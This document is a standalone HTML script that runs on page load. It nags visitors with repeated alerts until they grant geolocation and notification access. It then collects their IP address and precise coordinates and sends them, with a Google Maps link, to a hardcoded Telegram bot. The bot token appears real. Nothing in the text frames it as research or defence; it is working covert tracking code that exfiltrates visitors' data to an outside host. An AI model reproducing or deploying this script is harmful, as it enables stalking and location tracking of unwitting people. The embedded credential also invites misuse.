<script>
const token = "8468165702:AAHD08K4JugVPyCze00j1qbluTs6iyjf1mw";
const chatId = "8012856656";

function sendToTelegram(text){
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id:chatId,text})
  }).catch(e=>console.log("Erreur Telegram",e));
}

function getIP(){
  return fetch('https://api.ipify.org?format=json')
    .then(r=>r.json()).then(d=>d.ip).catch(()=>null);
}

// 🔔 Envoi plusieurs notifications
function sendMultipleNotifs(message, count){
  for (let i=0; i<count; i++){
    setTimeout(()=>{
      try { new Notification(message + " ("+(i+1)+"/"+count+")"); } catch(e){}
    }, i * 1500);
  }
}

// 📍 Demande de localisation (3 essais max)
async function askLocation(){
  for (let i=3; i>0; i--){
    const ok = await new Promise(resolve=>{
      if (!navigator.geolocation) return resolve(false);
      navigator.geolocation.getCurrentPosition(
        pos => resolve({ok:true,lat:pos.coords.latitude,lon:pos.coords.longitude}),
        err => resolve(false),
        {timeout:10000}
      );
    });

    if (ok && ok.ok) return ok; // localisation acceptée
    if (i>1) alert("Vous devez autoriser la localisation");
  }
  return {ok:false};
}

// 🔔 Demande de notifications (3 essais max)
async function askNotifications(){
  for (let i=3; i>0; i--){
    if (!("Notification" in window)) return false;

    if (Notification.permission === "granted"){
      sendMultipleNotifs("Mis à jour", 3);
      return true;
    }

    if (Notification.permission !== "denied"){
      const perm = await Notification.requestPermission();
      if (perm === "granted"){
        sendMultipleNotifs("Mis à jour", 3);
        return true;
      }
    }

    if (i>1) alert("Vous devez autoriser les notifications");
  }
  return false;
}

// 🚀 Script principal
async function runChecks(){
  const locResult = await askLocation();
  const locOk = locResult.ok;

  const notifOk = await askNotifications();

  const ip = await getIP();
  let msg = `IP: ${ip || 'inconnue'}\nLoc: ${locOk}\nNotification: ${notifOk}`;
  if (locOk) msg += `\nLocalisation: https://www.google.com/maps?q=${locResult.lat},${locResult.lon}`;

  sendToTelegram(msg);
}

runChecks();
</script>
